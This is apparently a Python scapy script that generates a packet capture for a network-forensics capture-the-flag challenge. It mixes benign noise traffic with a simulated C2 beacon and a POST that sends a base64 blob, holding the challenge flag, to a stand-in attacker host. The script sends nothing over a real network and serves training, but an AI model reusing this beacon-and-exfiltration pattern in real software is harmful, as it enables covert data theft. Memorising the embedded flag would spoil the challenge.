

import base64
from scapy.all import (
    Ether, IP, TCP, UDP, ARP, DNS, DNSQR, DNSRR, Raw, wrpcap
)

PKTS = []          
T = 1000.0         

def add(pkt, dt=0.012):
    
    global T
    T += dt
    pkt.time = T
    PKTS.append(pkt)


#  MAC + IP map   

MAC = {
    "ws":   "08:00:27:a1:b2:37",   # compromised workstation
    "gw":   "08:00:27:00:00:01",   # gateway / router
    "dns":  "08:00:27:00:00:53",   # internal DNS
    "srv":  "08:00:27:0c:af:21",   # internal file server (noise)
}
IPS = {
    "ws":   "10.10.14.37",         # GuardianOS-WS-07  (compromised host)
    "gw":   "10.10.14.1",
    "dns":  "10.10.14.53",
    "srv":  "10.10.14.20",
    "cdn":  "151.101.0.14",        # benign CDN (noise)
    "upd":  "104.18.22.9",         # benign update server (noise)
    "c2":   "45.133.9.17",         # >>> attacker C2 server <<<
}


#  TCP conversation helper

class TCPStream:
    def __init__(self, cmac, smac, cip, sip, sport, dport):
        self.cmac, self.smac = cmac, smac
        self.cip, self.sip = cip, sip
        self.sport, self.dport = sport, dport
        self.cseq = 1000            # client initial seq
        self.sseq = 5000            # server initial seq

    def _c(self, flags, payload=b"", ack=0):
        p = (Ether(src=self.cmac, dst=self.smac) /
             IP(src=self.cip, dst=self.sip) /
             TCP(sport=self.sport, dport=self.dport,
                 flags=flags, seq=self.cseq, ack=ack))
        if payload:
            p = p / Raw(load=payload)
        return p

    def _s(self, flags, payload=b"", ack=0):
        p = (Ether(src=self.smac, dst=self.cmac) /
             IP(src=self.sip, dst=self.cip) /
             TCP(sport=self.dport, dport=self.sport,
                 flags=flags, seq=self.sseq, ack=ack))
        if payload:
            p = p / Raw(load=payload)
        return p

    def handshake(self):
        # SYN
        add(self._c("S"))
        self.cseq += 1
        # SYN-ACK
        add(self._s("SA", ack=self.cseq))
        self.sseq += 1
        # ACK
        add(self._c("A", ack=self.sseq))

    def client_says(self, data: bytes):
        """Client -> Server data + server ACK."""
        add(self._c("PA", payload=data, ack=self.sseq))
        self.cseq += len(data)
        add(self._s("A", ack=self.cseq))

    def server_says(self, data: bytes):
        """Server -> Client data + client ACK."""
        add(self._s("PA", payload=data, ack=self.cseq))
        self.sseq += len(data)
        add(self._c("A", ack=self.sseq))

    def close(self):
        add(self._c("FA", ack=self.sseq)); self.cseq += 1
        add(self._s("FA", ack=self.cseq)); self.sseq += 1
        add(self._c("A",  ack=self.sseq))

#  DNS helper (noise)

def dns_lookup(qname, ans_ip, txid):
    q = (Ether(src=MAC["ws"], dst=MAC["dns"]) /
         IP(src=IPS["ws"], dst=IPS["dns"]) /
         UDP(sport=40000 + txid, dport=53) /
         DNS(id=txid, rd=1, qd=DNSQR(qname=qname)))
    add(q)
    r = (Ether(src=MAC["dns"], dst=MAC["ws"]) /
         IP(src=IPS["dns"], dst=IPS["ws"]) /
         UDP(sport=53, dport=40000 + txid) /
         DNS(id=txid, qr=1, aa=1, rd=1, ra=1,
             qd=DNSQR(qname=qname),
             an=DNSRR(rrname=qname, ttl=300, rdata=ans_ip)))
    add(r)


#  1) NOISE  —  "The first layer is always noise."

def build_noise():
    # ARP who-has (network chatter)
    add(Ether(src=MAC["ws"], dst="ff:ff:ff:ff:ff:ff") /
        ARP(op=1, psrc=IPS["ws"], pdst=IPS["gw"],
            hwsrc=MAC["ws"]))
    add(Ether(src=MAC["gw"], dst=MAC["ws"]) /
        ARP(op=2, psrc=IPS["gw"], pdst=IPS["ws"],
            hwsrc=MAC["gw"], hwdst=MAC["ws"]))

    # a few benign DNS lookups
    dns_lookup("cdn.guardianos.io.",     IPS["cdn"], 101)
    dns_lookup("updates.guardianos.io.", IPS["upd"], 102)
    dns_lookup("intranet.guardianos.io.",IPS["srv"], 103)

    # benign HTTP session 1: CDN asset fetch
    s = TCPStream(MAC["ws"], MAC["gw"], IPS["ws"], IPS["cdn"], 49201, 80)
    s.handshake()
    s.client_says(b"GET /assets/app.min.js HTTP/1.1\r\n"
                  b"Host: cdn.guardianos.io\r\n"
                  b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                  b"Accept: */*\r\n\r\n")
    s.server_says(b"HTTP/1.1 200 OK\r\n"
                  b"Content-Type: application/javascript\r\n"
                  b"Content-Length: 41\r\n\r\n"
                  b"console.log('guardianos dashboard ready');")
    s.close()

    # benign HTTP session 2: update check
    s = TCPStream(MAC["ws"], MAC["gw"], IPS["ws"], IPS["upd"], 49202, 80)
    s.handshake()
    s.client_says(b"GET /v2/check?product=guardianos&ver=4.1.2 HTTP/1.1\r\n"
                  b"Host: updates.guardianos.io\r\n"
                  b"User-Agent: GuardianOS-Updater/4.1.2\r\n\r\n")
    s.server_says(b"HTTP/1.1 200 OK\r\n"
                  b"Content-Type: application/json\r\n"
                  b"Content-Length: 27\r\n\r\n"
                  b'{"status":"up_to_date"}   ')
    s.close()

    # benign HTTP session 3: intranet portal
    s = TCPStream(MAC["ws"], MAC["srv"], IPS["ws"], IPS["srv"], 49203, 80)
    s.handshake()
    s.client_says(b"GET /portal/home HTTP/1.1\r\n"
                  b"Host: intranet.guardianos.io\r\n"
                  b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                  b"Cookie: session=7f3b9c; theme=dark\r\n\r\n")
    s.server_says(b"HTTP/1.1 200 OK\r\n"
                  b"Content-Type: text/html\r\n"
                  b"Content-Length: 52\r\n\r\n"
                  b"<html><body><h1>GuardianOS Intranet</h1></body></html>")
    s.close()


#  2) THE C2 STREAM  —  the conversation that shouldn't be there

def build_c2():
    # first, a DNS lookup for the C2 domain (slightly odd TLD)
    dns_lookup("sync-cdn-telemetry.top.", IPS["c2"], 207)

    # the flag, wrapped in one base64 "layer"
    exfil = (
        "operator: RAVEN-17\n"
        "note: The first layer is always noise.\n"
        "host: GuardianOS-WS-07 (10.10.14.37)\n"
        "flag: RAVEN{traffic_never_lies}\n"
    )
    exfil_b64 = base64.b64encode(exfil.encode()).decode()

    s = TCPStream(MAC["ws"], MAC["gw"], IPS["ws"], IPS["c2"], 49999, 8080)
    s.handshake()

    # --- beacon (GET) : carries the X-Raven-ID header ---
    s.client_says(
        b"GET /gate/beacon?id=ws07 HTTP/1.1\r\n"
        b"Host: sync-cdn-telemetry.top:8080\r\n"
        b"User-Agent: Mozilla/5.0 (compatible; GDN-sync/1.0)\r\n"
        b"X-Raven-ID: RAVEN-17\r\n"
        b"Accept: */*\r\n\r\n"
    )
    s.server_says(
        b"HTTP/1.1 200 OK\r\n"
        b"Server: nginx\r\n"
        b"Content-Type: text/plain\r\n"
        b"Content-Length: 14\r\n\r\n"
        b"task=report_in"
    )

    # --- exfil (POST) : carries the base64 flag blob ---
    body = exfil_b64.encode()
    post = (
        b"POST /gate/report HTTP/1.1\r\n"
        b"Host: sync-cdn-telemetry.top:8080\r\n"
        b"User-Agent: Mozilla/5.0 (compatible; GDN-sync/1.0)\r\n"
        b"X-Raven-ID: RAVEN-17\r\n"
        b"Content-Type: application/octet-stream\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body
    )
    s.client_says(post)
    s.server_says(
        b"HTTP/1.1 200 OK\r\n"
        b"Server: nginx\r\n"
        b"Content-Length: 2\r\n\r\n"
        b"ok"
    )
    s.close()

#  Build + write

def main():
    build_noise()
    build_c2()
    # extra trailing noise so the C2 stream isn't the very last thing
    dns_lookup("telemetry.guardianos.io.", IPS["upd"], 108)

    PKTS.sort(key=lambda p: p.time)   

    fixed = []
    for p in PKTS:
        t = p.time
        raw = bytes(p)                       # forces recompute on rebuild
        np = Ether(raw)
        np.time = t
        fixed.append(np)

    wrpcap("incident_traffic.pcap", fixed)
    print(f"[+] wrote incident_traffic.pcap  ({len(fixed)} packets)")

if __name__ == "__main__":
    main()
